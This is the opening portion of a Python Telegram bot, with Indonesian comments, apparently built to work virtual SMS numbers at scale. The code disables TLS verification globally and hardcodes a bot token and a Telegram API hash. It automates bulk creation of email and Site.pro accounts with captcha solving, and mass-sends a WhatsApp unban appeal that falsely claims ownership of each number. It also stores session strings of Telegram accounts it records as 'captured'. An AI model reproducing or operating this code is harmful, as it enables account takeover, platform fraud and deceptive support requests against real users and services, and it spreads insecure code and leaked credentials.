import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")
import html
import requests
import re
import time
import sqlite3
import json
import os
import threading
import asyncio
import socketio  
import logging
from datetime import datetime, timedelta
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
import ssl
import certifi

import random
import string

# ── Telegram MTProto API (Telethon) ──────────────────────────
TG_API_ID = 37365889
TG_API_HASH = "78969cf319a8f18260369f10d0ae053a"
try:
    from telethon import TelegramClient, events
    from telethon.errors import (
        PhoneNumberUnoccupiedError, PhoneNumberBannedError,
        PhoneNumberFloodError, PhoneNumberInvalidError,
        FloodWaitError, AuthKeyUnregisteredError,
    )
    from telethon.tl.functions.auth import SendCodeRequest
    from telethon.tl.types import CodeSettings
    from telethon.sessions import StringSession
    from telethon.tl.functions.contacts import ImportContactsRequest, DeleteContactsRequest, ResolvePhoneRequest
    from telethon.tl.types import InputPhoneContact
    from telethon.errors import (
        SessionPasswordNeededError, PhoneCodeInvalidError,
        PhoneCodeExpiredError, PasswordHashInvalidError
    )
    TELETHON_OK = True
    print("✅ Telethon loaded — /check ready")
except ImportError:
    TELETHON_OK = False
    print("⚠️  Telethon not installed — /check disabled (pip install telethon)")

USER_AGENTS = [
    # Chrome on Android (mobile)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

# UA stabil untuk request API — harus sama dengan saat cookie cf_clearance dibuat (Android)
DEFAULT_IVAS_UA = (
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36"
)


def _ivas_session(cookies_dict, user_agent=None):
    """Buat requests.Session dengan cookie + UA konsisten (penting untuk Cloudflare)."""
    session = requests.Session()
    try:
        apply_proxy_to_session(session)
    except Exception:
        pass
    if cookies_dict:
        for key, value in cookies_dict.items():
            if value:
                session.cookies.set(key, value)
    ua = user_agent or DEFAULT_IVAS_UA
    session.headers.update({
        'User-Agent': ua,
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection': 'keep-alive',
    })
    return session, ua


def get_stored_user_agent(user_id):
    """Ambil User-Agent yang disimpan saat login (hindari 403 Cloudflare)."""
    try:
        cur.execute(
            "SELECT session_data FROM user_sessions WHERE user_id = ? AND is_active = 1",
            (user_id,),
        )
        row = cur.fetchone()
        if not row:
            cur.execute(
                "SELECT session_data FROM user_sessions WHERE user_id = ? ORDER BY last_used DESC LIMIT 1",
                (user_id,),
            )
            row = cur.fetchone()
        if row and row[0]:
            data = json.loads(row[0])
            return data.get('user_agent') or None
    except Exception:
        pass
    return None


def ensure_csrf_fresh(session, csrf):
    """Refresh CSRF dari halaman SMS Received atau cookie XSRF-TOKEN."""
    try:
        from urllib.parse import unquote
        xsrf = session.cookies.get('XSRF-TOKEN')
        if xsrf:
            decoded = unquote(xsrf)
            if decoded:
                return decoded
    except Exception:
        pass
    try:
        resp = session.get(
            f"{BASE_URL}/portal/sms/received",
            timeout=15,
            headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Referer': f"{BASE_URL}/portal",
            },
        )
        if resp.status_code == 200:
            new_csrf = extract_csrf_from_page(resp.text)
            if new_csrf:
                return new_csrf
    except Exception as e:
        print(f"[NOTIF] ensure_csrf_fresh error: {e}")
    return csrf

try:
    
    import os
    os.environ['SSL_CERT_FILE'] = certifi.where()
    os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
    
    
    original_create_default_context = ssl.create_default_context
    
    def patched_create_default_context(*args, **kwargs):
        context = original_create_default_context(*args, **kwargs)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        return context
    
    ssl.create_default_context = patched_create_default_context
    
    print(" SSL Certificate fix applied")

    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # Patch requests to always use verify=False
    _old_request = requests.Session.request
    def _new_request(self, method, url, **kwargs):
        kwargs.setdefault('verify', False)
        return _old_request(self, method, url, **kwargs)
    requests.Session.request = _new_request

    # Patch Session.__init__ untuk SELALU pasang browser User-Agent + header standar.
    # Cookie cf_clearance Cloudflare TERIKAT ke User-Agent — kalau UA beda dari saat
    # cookie didapat, Cloudflare langsung 403. Banyak callsite di file ini bikin
    # requests.Session() tanpa set UA, jadi kita inject sekali di sini.
    _old_session_init = requests.Session.__init__
    def _new_session_init(self, *args, **kwargs):
        _old_session_init(self, *args, **kwargs)
        try:
            self.headers.update({
                'User-Agent': get_random_user_agent(),
                'Accept-Language': 'en-US,en;q=0.9',
                'Sec-Ch-Ua-Mobile': '?1',
                'Sec-Ch-Ua-Platform': '"Android"',
            })
        except Exception:
            pass
    requests.Session.__init__ = _new_session_init
    print(" Browser User-Agent patch applied to requests.Session")

except Exception as e:
    print(f" SSL fix error: {e}")
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
from telegram.constants import ParseMode
from telegram.error import BadRequest, TimedOut, NetworkError

# Global Monkeypatch to ignore CallbackQuery answer timeouts/errors
original_answer = CallbackQuery.answer
async def patched_answer(self, *args, **kwargs):
    try:
        return await original_answer(self, *args, **kwargs)
    except Exception as e:
        print(f"[DEBUG] CallbackQuery.answer ignored timeout/error: {e}")
        return None
CallbackQuery.answer = patched_answer
from telegram.request import HTTPXRequest
def get_random_proxy():
    """Proxy dinonaktifkan"""
    return None

def apply_proxy_to_session(session):
    """Proxy dinonaktifkan"""
    return False

from functools import lru_cache
def safe_markdown(text: str) -> str:
    """Escape karakter khusus untuk Markdown"""
    if not text:
        return text
    import re
    text = text.replace('_', '\\_')
    
    text = text.replace('*', '\\*')
    
    text = text.replace('', '\\')
    return text





logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot.log", encoding="utf-8"),
        logging.StreamHandler(sys.stdout)
    ]
)

logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)
logging.getLogger("asyncio").setLevel(logging.WARNING)
logging.getLogger("socketio").setLevel(logging.WARNING)
logging.getLogger("engineio").setLevel(logging.WARNING)
logging.getLogger("requests").setLevel(logging.WARNING)


logging.getLogger("httpx").setLevel(logging.CRITICAL)
logging.getLogger("httpcore").setLevel(logging.CRITICAL)


logger = logging.getLogger(__name__)
logger.setLevel(logging.ERROR)  


TELEGRAM_BOT_TOKEN = "8792657812:AAH6v2p20WNOlrBaYd9O4gw-Z-tXoxavzN8"
USER_ID = 6446678808
CHANNEL_USERNAME = "yoursistersz"
BOT_USERNAME = "maklohytam_bot"

DEBUG_MODE = False
MONITOR_INTERVAL = 15
SMS_AKTIF_INTERVAL = 5
SESSION_WARN_HOURS = 18
DASHBOARD_CACHE_SEC = 60

APP_FILTER_KEYWORDS = {
    'all': None,
    'whatsapp': ['whatsapp', 'wa-', ' wa '],
    'telegram': ['telegram', 'tg-'],
    'tiktok': ['tiktok', 'tik tok'],
    'facebook': ['facebook', 'fb-'],
    'instagram': ['instagram', 'insta'],
    'google': ['google', 'gmail'],
    'microsoft': ['microsoft', 'outlook', 'hotmail'],
    'viber': ['viber'],
}

BASE_URL = "https://ivas.tempnum.qzz.io"
NUMBERS_PAGE_URL = f"{BASE_URL}/portal/numbers"
BULK_RETURN_URL = f"{BASE_URL}/portal/numbers/return/allnumber/bluck"
EXPORT_URL = f"{BASE_URL}/portal/numbers/export"
PROFILE_URL = f"{BASE_URL}/portal/profile"
TEST_COMM = f"{BASE_URL}/portal/live/test_sms"
CHAT_SERVER = "https://hub.orangecarrier.com"
CHAT_WEBSOCKET = "wss://hub.orangecarrier.com"


TEST_NUMBERS_URL = f"{BASE_URL}/portal/numbers/test"
ADD_NUMBER_URL = f"{BASE_URL}/portal/numbers/termination/number/add"

# ── Site.pro + emailqu + WhatsApp Fix ──────────────────────────
CAPTCHA_API_KEY = ""   # Opsional: API key captcha solver (2captcha/capsolver/anticaptcha)
CAPTCHA_SOLVER = "browser"  # "browser" (gratis, pakai Chrome), "2captcha", "capsolver", "anticaptcha"
EMAILQU_BASE = "https://emailqu.com"
SITEPRO_BASE = "https://site.pro"
SITEPRO_WEBMAIL = "https://siteprofree.email"
SITEPRO_RECAPTCHA_SITEKEY = "6LeKkToUAAAAAHd9EiB6BaSXazFQ5CFIxmyLFm1Z"
SITEPRO_MAILBOX_DOMAIN_ID = 3  # siteprofree.email
WA_SUPPORT_EMAIL = "support@support.whatsapp.com"
WA_FIX_MESSAGE_TEMPLATE = (
"Здравствуйте, команда поддержки WhatsApp.\n\n"
"Я обращаюсь к вам с уважительной просьбой провести тщательную проверку моей учетной записи WhatsApp и помочь "
"восстановить доступ к ней. В настоящее время я не могу пользоваться своим аккаунтом, несмотря на то что номер "
"телефона остается активным, находится в моем владении и используется мной на постоянной основе.\n\n"
"В процессе попыток входа в аккаунт я столкнулся(ась) со следующими трудностями:\n"
"• Не поступает код подтверждения (OTP) для завершения процедуры входа.\n"
"• Отображается сообщение «Доступ недоступен» либо другие уведомления, препятствующие авторизации.\n"
"• Учетная запись выглядит заблокированной, ограниченной или недоступной для использования.\n"
"• Повторные попытки подтверждения номера не приводят к положительному результату.\n\n"
"Для решения проблемы я уже выполнил(а) все основные рекомендации: неоднократно запрашивал(а) новый код подтверждения, "
"перезапускал(а) устройство, проверял(а) стабильность интернет-соединения, обновлял(а) приложение до последней версии "
"и повторно устанавливал(а) WhatsApp. К сожалению, ни один из этих шагов не помог восстановить доступ.\n\n"
"Я подтверждаю, что являюсь законным владельцем данного номера телефона и использую его исключительно в личных целях. "
"Мне неизвестны какие-либо действия с моей стороны, которые могли бы нарушить Условия использования WhatsApp, "
"Политику конфиденциальности или иные правила платформы. Я всегда стремился(ась) соблюдать требования сервиса "
"и использовать его добросовестно.\n\n"
"Если ограничение доступа было применено автоматически системой безопасности по ошибке, прошу выполнить дополнительную "
"ручную проверку моей учетной записи. Также буду признателен(льна), если вы сможете сообщить возможную причину возникшей проблемы "
"или предоставить рекомендации для ее скорейшего устранения.\n\n"
"Прошу вашу команду внимательно рассмотреть мое обращение и, если это возможно, восстановить доступ к аккаунту "
"в кратчайшие сроки. При необходимости я готов(а) предоставить дополнительные сведения для подтверждения личности "
"и права владения номером телефона.\n\n"
"Номер телефона, связанный с учетной записью:\n"
"+{nomor}\n\n"
"Заранее благодарю вас за уделенное время, внимание и помощь. "
"Буду признателен(льна) за любое содействие в решении данной ситуации.\n\n"
"С уважением."
)


# ── Site.pro Concurrency Control ─────────────────────────────
SITEPRO_MAX_CONCURRENT = 50       # Max concurrent tasks per user (large = effectively unlimited)
SITEPRO_MAX_WORKERS = 5          # Max parallel browser instances (legacy, kept for compat)
SITEPRO_GLOBAL_POOL_SIZE = 32     # Total workers shared by SEMUA user (/fix + /create)
SITEPRO_CREATE_MAX_PARALLEL = 4   # Max browser /create yang jalan bersamaan (anti OOM)
_sitepro_active_locks = {}        # {user_id: count}
_sitepro_lock = threading.Lock()  # Thread-safe lock

# Batasi jumlah pipeline /create yang benar-benar jalan bersamaan. Walau 500
# task dilempar ke pool, hanya SITEPRO_CREATE_MAX_PARALLEL yang buka browser
# pada saat yang sama; sisanya antri di semaphore ini.
_SITEPRO_CREATE_SEM = threading.Semaphore(SITEPRO_CREATE_MAX_PARALLEL)

# Satu pool global dipakai oleh seluruh /fix dan /create dari semua user.
# Tujuan: tugas user B / C tidak harus menunggu user A selesai, semua jalan paralel.
from concurrent.futures import ThreadPoolExecutor as _GlobalTPE
_SITEPRO_GLOBAL_POOL = _GlobalTPE(
    max_workers=SITEPRO_GLOBAL_POOL_SIZE,
    thread_name_prefix="sitepro",
)


def _sitepro_can_start(user_id):
    """Check if user can start a new sitepro task. Returns (bool, message)."""
    with _sitepro_lock:
        is_owner_user = (user_id == USER_ID)
        current = _sitepro_active_locks.get(user_id, 0)
        if is_owner_user:
            # Owner: unlimited tasks
            _sitepro_active_locks[user_id] = current + 1
            return True, None
        if current >= SITEPRO_MAX_CONCURRENT:
            return False, f"Kamu sudah punya {current} task aktif. Maksimal {SITEPRO_MAX_CONCURRENT} task per user. Tunggu sampai selesai."
        _sitepro_active_locks[user_id] = current + 1
        return True, None


def _sitepro_release(user_id):
    """Release a sitepro task slot."""
    with _sitepro_lock:
        current = _sitepro_active_locks.get(user_id, 0)
        if current > 0:
            _sitepro_active_locks[user_id] = current - 1
        else:
            _sitepro_active_locks[user_id] = 0


def _sitepro_get_active(user_id):
    """Get active task count for a user."""
    with _sitepro_lock:
        return _sitepro_active_locks.get(user_id, 0)

MAX_NUMBERS_KEYWORDS = [
    'maximum number of numbers on the system',
    'maximum limit of numbers allowed',
    'account full',
    'cannot add more numbers',
    'you have a maximum number of numbers'
]
SUCCESS_KEYWORDS = ['success', 'successfully', 'done', 'added', 'complete', 'berhasil', 'sukses']
RATE_LIMIT_KEYWORDS = ['maximum number of add numbers', 'please wait', 'too many requests']



class ThreadLocalConnectionProxy:
    def __init__(self):
        self._local = threading.local()

    def _get_conn(self):
        if not hasattr(self._local, "conn"):
            # Create connection for this thread with busy timeout = 30 seconds
            self._local.conn = sqlite3.connect('ivas_bot.db', timeout=30, check_same_thread=False)
            self._local.cur = self._local.conn.cursor()
        return self._local.conn

    def _get_cur(self):
        self._get_conn()
        return self._local.cur

    def commit(self):
        self._get_conn().commit()

    def rollback(self):
        self._get_conn().rollback()

    def cursor(self):
        return self

    def execute(self, *args, **kwargs):
        return self._get_cur().execute(*args, **kwargs)

    def executemany(self, *args, **kwargs):
        return self._get_cur().executemany(*args, **kwargs)

    def fetchone(self, *args, **kwargs):
        return self._get_cur().fetchone(*args, **kwargs)

    def fetchall(self, *args, **kwargs):
        return self._get_cur().fetchall(*args, **kwargs)

    def close(self):
        if hasattr(self._local, "conn"):
            try:
                self._local.conn.close()
            except:
                pass
            del self._local.conn
            if hasattr(self._local, "cur"):
                del self._local.cur

db_proxy = ThreadLocalConnectionProxy()
conn = db_proxy
cur = db_proxy


cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='user_sessions'")
table_exists = cur.fetchone()

if table_exists:
    cur.execute("PRAGMA table_info(user_sessions)")
    columns = [col[1] for col in cur.fetchall()]
    print(f"📁 Kolom yang ada di user_sessions: {columns}")
    
    # Periksa apakah is_active ada, jika tidak, kita migrasi total
    if 'is_active' not in columns:
        print("📁 Mengupdate struktur tabel untuk Multi-Account & Keep-Alive...")
        
        # Backup data
        cur.execute("SELECT * FROM user_sessions")
        old_data = cur.fetchall()
        column_names = columns
        
        # Drop and Recreate
        cur.execute("DROP TABLE user_sessions")
        cur.execute('''CREATE TABLE user_sessions (
            user_id INTEGER,
            email TEXT NOT NULL,
            password TEXT NOT NULL,
            session_data TEXT,
            login_attempts INTEGER DEFAULT 0,
            last_attempt TIMESTAMP,
            last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            is_active INTEGER DEFAULT 0,
            PRIMARY KEY (user_id, email)
        )''')
        
        # Restore with is_active = 1 for the only account they had
        if old_data:
            for row in old_data:
                data_dict = dict(zip(column_names, row))
                try:
                    cur.execute("""
                        INSERT INTO user_sessions 
                        (user_id, email, password, session_data, login_attempts, last_attempt, last_used, is_active)
                        VALUES (?, ?, ?, ?, ?, ?, ?, 1)
                    """, (
                        data_dict.get('user_id'), 
                        data_dict.get('email', 'unknown'), 
                        data_dict.get('password', ''), 
                        data_dict.get('session_data'), 
                        data_dict.get('login_attempts', 0), 
                        data_dict.get('last_attempt'), 
                        data_dict.get('last_used', 'datetime("now")')
                    ))
                except: pass
        conn.commit()
    else:
        print("2 Struktur tabel user_sessions sudah mendukung Multi-Account")
        
else:
    print("📁 Membuat tabel user_sessions baru...")
    cur.execute('''CREATE TABLE user_sessions (
        user_id INTEGER,
        email TEXT NOT NULL,
        password TEXT NOT NULL,
        session_data TEXT,
        login_attempts INTEGER DEFAULT 0,
        last_attempt TIMESTAMP,
        last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        is_active INTEGER DEFAULT 0,
        PRIMARY KEY (user_id, email)
    )''')
    conn.commit()
    print(" Tabel user_sessions berhasil dibuat")


cur.execute('''CREATE TABLE IF NOT EXISTS active_tasks (
    task_id TEXT PRIMARY KEY,
    user_id INTEGER,
    cancel_flag INTEGER DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')
conn.commit()

cur.execute('''CREATE TABLE IF NOT EXISTS allowed_users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    added_by INTEGER,
    added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')
conn.commit()



cur.execute('''CREATE TABLE IF NOT EXISTS admins (
    user_id INTEGER PRIMARY KEY
)''')
conn.commit()

cur.execute('''CREATE TABLE IF NOT EXISTS owner_switch (
    owner_id INTEGER PRIMARY KEY,
    target_user_id INTEGER NOT NULL,
    target_email TEXT NOT NULL
)''')
conn.commit()

cur.execute('''CREATE TABLE IF NOT EXISTS user_bot_tokens (
    user_id INTEGER PRIMARY KEY,
    bot_token TEXT NOT NULL,
    chat_id INTEGER,
    is_active INTEGER DEFAULT 0,
    app_filter TEXT DEFAULT 'all',
    created_at TEXT DEFAULT CURRENT_TIMESTAMP
)''')
conn.commit()
# Migrate: tambah kolom app_filter jika belum ada
try:
    cur.execute("ALTER TABLE user_bot_tokens ADD COLUMN app_filter TEXT DEFAULT 'all'")
    conn.commit()
except Exception:
    pass

cur.execute('''CREATE TABLE IF NOT EXISTS favorite_ranges (
    user_id INTEGER,
    range_name TEXT NOT NULL,
    added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    PRIMARY KEY (user_id, range_name)
)''')
conn.commit()

cur.execute('''CREATE TABLE IF NOT EXISTS user_preferences (
    user_id INTEGER PRIMARY KEY,
    monitor_app_filter TEXT DEFAULT 'all',
    monitor_compact INTEGER DEFAULT 0,
    onboarded INTEGER DEFAULT 0
)''')
conn.commit()

# Penyimpanan setting per-user (key/value). Saat ini dipakai untuk template
# pesan /fix custom ('fix_template').
cur.execute('''CREATE TABLE IF NOT EXISTS bot_settings (
    user_id INTEGER,
    key TEXT,
    value TEXT,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    PRIMARY KEY (user_id, key)
)''')
conn.commit()

cur.execute('''CREATE TABLE IF NOT EXISTS sitepro_accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    temp_email TEXT,
    sitepro_email TEXT,
    sitepro_password TEXT,
    phpsessid TEXT,
    csrf_token TEXT,
    mailbox_id INTEGER,
    website_id INTEGER,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    status TEXT DEFAULT 'created'
)''')
conn.commit()

# Migration: tambah kolom send_count & last_used_at kalau belum ada
try:
    cur.execute("PRAGMA table_info(sitepro_accounts)")
    _existing_cols = {row[1] for row in cur.fetchall()}
    if 'send_count' not in _existing_cols:
        cur.execute("ALTER TABLE sitepro_accounts ADD COLUMN send_count INTEGER DEFAULT 0")
    if 'last_used_at' not in _existing_cols:
        cur.execute("ALTER TABLE sitepro_accounts ADD COLUMN last_used_at TIMESTAMP")
    conn.commit()
except Exception as _e:
    print(f"[DB] sitepro_accounts migrate warn: {_e}")

# AtomicMail accounts (pipeline API). Token disimpan agar bisa login ulang
# lewat accessToken tanpa sign-up baru.
cur.execute('''CREATE TABLE IF NOT EXISTS atomicmail_accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    address TEXT,
    username TEXT,
    atomic_user_id TEXT,
    access_token TEXT,
    session_id TEXT,
    aliases TEXT,
    alias_count INTEGER DEFAULT 0,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_used_at TIMESTAMP,
    status TEXT DEFAULT 'active'
)''')
conn.commit()

# 1 akun Site.pro = maksimal 5 mailbox (sender). Tiap mailbox dilacak di sini.
# Sender bisa dipakai ulang setelah cooldown 1 jam (last_used_at). compose_count
# = total compose seumur hidup sender.
cur.execute('''CREATE TABLE IF NOT EXISTS sitepro_mailboxes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    account_id INTEGER,
    mailbox_id INTEGER,
    email TEXT,
    used INTEGER DEFAULT 0,
    used_for TEXT,
    compose_count INTEGER DEFAULT 0,
    last_used_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')
conn.commit()

# Migration: kolom compose_count & last_used_at utk DB lama
try:
    cur.execute("PRAGMA table_info(sitepro_mailboxes)")
    _mb_cols = {row[1] for row in cur.fetchall()}
    if 'compose_count' not in _mb_cols:
        cur.execute("ALTER TABLE sitepro_mailboxes ADD COLUMN compose_count INTEGER DEFAULT 0")
    if 'last_used_at' not in _mb_cols:
        cur.execute("ALTER TABLE sitepro_mailboxes ADD COLUMN last_used_at TIMESTAMP")
    conn.commit()
except Exception as _e:
    print(f"[DB] sitepro_mailboxes migrate warn: {_e}")

try:
    cur.execute("INSERT OR IGNORE INTO allowed_users (user_id, username, added_by) VALUES (?, ?, ?)", 
                (USER_ID, None, USER_ID))
    conn.commit()
    print(" Owner ditambahkan ke allowed_users")
except Exception as e:
    print(f" Gagal menambah owner ke allowed_users: {e}")

# ── Tabel untuk /check results ──
cur.execute('''CREATE TABLE IF NOT EXISTS tgcheck_results (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    phone TEXT,
    status TEXT,
    detail TEXT,
    checked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')
conn.commit()

# Sender accounts pool (banyak per user) untuk mode DETAIL (/check pakai sender)
cur.execute('''CREATE TABLE IF NOT EXISTS tgcheck_senders (
    user_id INTEGER PRIMARY KEY,
    phone TEXT,
    string_session TEXT,
    name TEXT,
    status TEXT DEFAULT 'active',
    added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')
conn.commit()

# Tabel pool: banyak sender per user + cooldown floodwait.
cur.execute('''CREATE TABLE IF NOT EXISTS tgcheck_pool (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    phone TEXT,
    string_session TEXT,
    name TEXT,
    status TEXT DEFAULT 'active',
    flood_until INTEGER DEFAULT 0,
    last_used INTEGER DEFAULT 0,
    added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')
conn.commit()

# Migrasi: pindahkan sender lama (single) ke pool kalau belum ada.
try:
    cur.execute("SELECT user_id, phone, string_session, name, status FROM tgcheck_senders")
    _old_senders = cur.fetchall()
    for _os in _old_senders:
        cur.execute("SELECT COUNT(*) FROM tgcheck_pool WHERE user_id=? AND phone=?", (_os[0], _os[1]))
        if cur.fetchone()[0] == 0 and _os[2]:
            cur.execute(
                "INSERT INTO tgcheck_pool (user_id, phone, string_session, name, status) VALUES (?,?,?,?,?)",
                (_os[0], _os[1], _os[2], _os[3], _os[4] or 'active')
            )
    conn.commit()
except Exception as _e:
    print(f"[POOL] migrasi sender lama dilewati: {_e}")

# Tabel captured accounts: akun yang berhasil di-login via LOGIN mode
cur.execute('''CREATE TABLE IF NOT EXISTS tgcheck_captured (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    phone TEXT,
    string_session TEXT,
    tg_id INTEGER,
    first_name TEXT,
    last_name TEXT,
    username TEXT,
    premium INTEGER DEFAULT 0,
    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')
conn.commit()

# ── Tabel proxy per-user (untuk /proxy simpan + /myproxy) ──
cur.execute('''CREATE TABLE IF NOT EXISTS user_proxies (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    proto TEXT,
    host TEXT,
    port TEXT,
    username TEXT,
    password TEXT,
    uri TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)''')
conn.commit()

E1 = "5796205953913196373"
E2 = "5420323339723881652"
E3 = "4956337889593000947"
E4 = "5438467424770867483"
E5 = "5438436750114439411"
E6 = "6003769830564434518"

# Custom Premium Emojis - Menu Buttons
CE_AKUN = "5256143829672672750"      # 👤 akun saya
CE_NOMOR = "5422696450888842691"     # 📞 nomor di profile
CE_EXPORT = "5258043150110301407"    # ⬆️ export
CE_HAPUS = "5870875489362513438"     # 🗑 hapus nomor
CE_ADD = "5348028367138483442"       # ✨ add range/nomor
CE_KELUAR = "6005775159384870794"    # 📲 keluar/logout

# Custom Premium Emojis - Platform
CE_TIKTOK = "5397672154651181662"    # 🤩 tiktok
CE_WHATSAPP = "5345943173401175849"  # ❤️ whatsapp
CE_TELEGRAM = "5285350148451344065"  # 💬 telegram
CE_MICROSOFT = "5812213339975060848" # 🧩 microsoft
CE_VIBER = "5280623335078634360"     # 💬 viber
CE_FACEBOOK = "5843720880756102917"  # 🔴 facebook

# Custom Premium Emojis - Utility
CE_LOADING = "5256024382337205926"   # 🟠 loading/proses

# Custom Premium Emojis - Profile/Info
CE_FILE    = "5870570722778156940"   # 📁 file
CE_PROFILE = "5870994129244131212"   # 👤 profile / id user
CE_WAKTU   = "5872756762347573066"   # ⏲ waktu / time
CE_EMAIL   = "5472239203590888751"   # 📩 email
CE_NEGARA  = "5240097896279326170"   # 🌏 negara / bumi
CE_LIVE    = "5870903672937911120"   # 📡 live sms
CE_MONITOR = "5472239203590888751"   # 🔔 monitor
CE_PLATFORM = "5213001905386567370"  # 🌍 platform/negara
CE_LINE    = "5873153278023307367"   # 📄 line extractor
CE_HELP    = "5870570722778156940"   # ❓ bantuan
CE_BACK    = "5449847653586188540"   # ◀️ kembali
CE_LOGIN   = "5355034377921244938"   # 🔑 login
CE_PROXY   = "5213001905386567370"  # 🌐 proxy/network
CE_DETAIL_NAME = "5316887736823591263"  # 👤 detail name
CE_DETAIL_ID   = "5262690351969215936"  # 🆔 detail id
CE_DETAIL_DATE = "5976320879259293509"  # 📅 detail date
CE_DETAIL_GEM  = "5330237710655306682"  # 💎 detail gem/diamond

def em(emoji_id, fallback="⭐"):
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'

EMOJI = {
    'SUCCESS': em(E1, '✅'), 'FAILED': em(E2, '❌'), 'WARNING': em(E2, '⚠️'), 'INFO': em(E3, 'ℹ️'),
    'USER': em(CE_PROFILE, '👤'), 'MAIL': em(CE_EMAIL, '📩'), 'COOKIE': em(CE_LOGIN, '🍪'), 'KEY': em(E5, '🔑'),
    'BULK': em(CE_HAPUS, '🗑'), 'EXPORT': em(CE_EXPORT, '📤'), 'LINE': '━━━━━━━━━━━━━━━━━━━━',
    'ROCKET': em(E6, '🚀'), 'BACK': em(CE_BACK, '◀️'), 'CLOSE': em(CE_BACK, '✖️'), 'CHECK': em(E1, '✔️'),
    'NAME': em(CE_PROFILE, '👤'), 'COUNTRY': em(CE_NEGARA, '🌏'), 'PHONE': em(CE_NOMOR, '📞'), 'PROFILE': em(CE_PROFILE, '👤'),
    'FIRE': em(E6, '🔥'), 'CROWN': em(E2, '👑'), 'BELL': em(CE_MONITOR, '🔔'), 'LOCK': em(E5, '🔒')
}


# ── Fancy Unicode Text Styling ──────────────────────────────
# Maps ASCII -> mathematical alphanumeric symbols supaya teks terlihat
# "mewah" di Telegram tanpa butuh custom emoji. Dipakai buat heading & label.
_BOLD_SANS_UP = {chr(65 + i): chr(0x1D5D4 + i) for i in range(26)}
_BOLD_SANS_LO = {chr(97 + i): chr(0x1D5EE + i) for i in range(26)}
_BOLD_SANS_NUM = {chr(48 + i): chr(0x1D7EC + i) for i in range(10)}
_ITAL_SANS_UP = {chr(65 + i): chr(0x1D608 + i) for i in range(26)}
_ITAL_SANS_LO = {chr(97 + i): chr(0x1D622 + i) for i in range(26)}


def _fancy_bold(text: str) -> str:
    """Font biasa — LO mau normal semua. (dipertahankan biar callsite aman)."""
    return text


def _fancy_italic(text: str) -> str:
    """Font biasa — LO mau normal semua. (dipertahankan biar callsite aman)."""
    return text


# Garis pemisah premium (gradasi blok) — lebih keren dari ━━━.
_BAR = "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰"
_BAR_THIN = "▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱"


def _quote(body: str, expandable: bool = False) -> str:
    """Bungkus teks dalam Telegram blockquote (format quote yg LO mau)."""
    tag = "blockquote expandable" if expandable else "blockquote"
    return f"<{tag}>{body}</blockquote>"


def _header(title: str, breadcrumb: str = "") -> str:
    bc = f"\n<i>{breadcrumb}</i>\n" if breadcrumb else "\n"
    return f"{em(E5,'🏴‍☠️')} <b>{_fancy_bold(title)}</b>{bc}{_BAR}"

def _footer() -> str:
    return f"{_BAR}\n{em(E4,'🎧')} <i>{_fancy_italic('Powered by')} </i><b>{_fancy_bold('DikZz')}</b>"

def _row(icon: str, label: str, value: str) -> str:
    return f"  {icon} <b>{label}:</b>  {value}"

def _screen(title: str, body: str, breadcrumb: str = "") -> str:
    """Layar HTML konsisten — SEMUA dibungkus blockquote (format quote)."""
    inner = f"{_header(title, breadcrumb)}\n{body}\n\n{_footer()}"
    return _quote(inner)

TEMPLATE_MAIN = """
{header}
Selamat datang, <b>{name}</b>{em6}

{em_profile} <b>ID</b>: <code>{user_id}</code>
{em_email} <b>Email</b>: {email_status}
{profile_info}
{dashboard_info}
{session_warn}
{onboard_tip}
